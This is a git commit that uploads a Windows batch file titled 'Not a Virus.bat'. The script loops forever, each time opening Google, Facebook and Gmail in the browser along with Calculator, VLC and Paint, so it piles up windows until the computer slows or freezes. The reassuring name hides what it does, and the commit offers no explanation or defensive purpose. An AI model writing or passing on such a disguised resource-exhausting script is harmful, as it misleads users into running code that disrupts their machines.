a9ae5bb20d0413ecba0451d0e25fa507534647a4
Daniel <107590165+Daniel-Valp@users.noreply.github.com>
2022-11-18 00:10:06 +0000

    Add files via upload

---
+++ Not a Virus.bat
@@ -0,0 +1,20 @@
+@echo off
+
+
+
+:a
+
+
+start www.google.com
+start calc
+start vlc 
+start www.facebook.com
+start vlc
+start clc
+start www.gmail.com
+start mspaint
+start vlc
+start www.google.com
+
+
+goto a: 
